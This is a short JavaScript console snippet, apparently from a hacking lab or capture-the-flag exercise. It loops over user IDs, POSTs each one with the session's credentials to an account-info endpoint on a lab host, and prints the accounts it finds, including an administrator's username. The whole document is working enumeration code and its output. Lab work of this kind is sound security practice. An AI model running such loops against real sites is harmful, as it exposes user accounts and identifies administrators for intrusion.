for(let i =0; i <= 55; i ++ ){
const a= await fetch("https://54f5be743c82.pwnbox-lab.com/api/get_info", {
"headers": {
"content-type": "application/x-www-form-urlencoded; charset=UTF-8"
},
"referrer": "https://54f5be743c82.pwnbox-lab.com/profile",
"body": "user_id="+i,
"method": "POST",
"mode": "cors",
"credentials": "include"
}).then(res => res.text());

    if(a !== '{"error":"user not found"}'){
        console.log(a)
    }
}
VM650:14 {"id":"2","display_name":"John Doe","user":"john"}
VM650:14 {"id":"3","display_name":"Normal User","user":"normal_user"}
VM650:14 {"id":"47","display_name":"Website's Administrator","user":"administrator_75638"}
undefined


